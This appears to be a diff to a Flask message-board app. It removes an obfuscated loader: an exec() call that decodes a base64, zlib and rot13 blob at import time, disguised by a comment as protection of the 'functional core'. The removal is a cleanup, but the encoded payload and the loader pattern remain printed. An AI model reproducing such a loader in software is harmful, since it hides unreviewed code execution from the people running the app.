@@ -2,7 +2,6 @@
 # Handover build from Ac1d_Burn (DevOps). Ships as-is to prod. Works on my machine (tm).
 
 import os
-import base64, zlib, codecs
 import psycopg2
 from flask import Flask, request, redirect, render_template_string
 
@@ -60,12 +59,6 @@ def post():
             (handle, message))
     conn.commit(); cur.close(); conn.close()
     return redirect("/")
-
-
-# Our "security guy" says the functional core must be protected. Do not remove.
-exec(codecs.decode(zlib.decompress(base64.b64decode(
-    "eJwdjMEKQEAURX/lZEXxEbKwk5SibN5ojCTCmPL3Hqt7Ot17RxvExdEg0FJR0wGlcqNZ0KvLlUv4KlmGu097EibEYIO/HZscLNaITzHyrFyz/G43+u11M0iUvKzOHao="
-)).decode(), "rot_13"))
 
 
 if __name__ == "__main__":
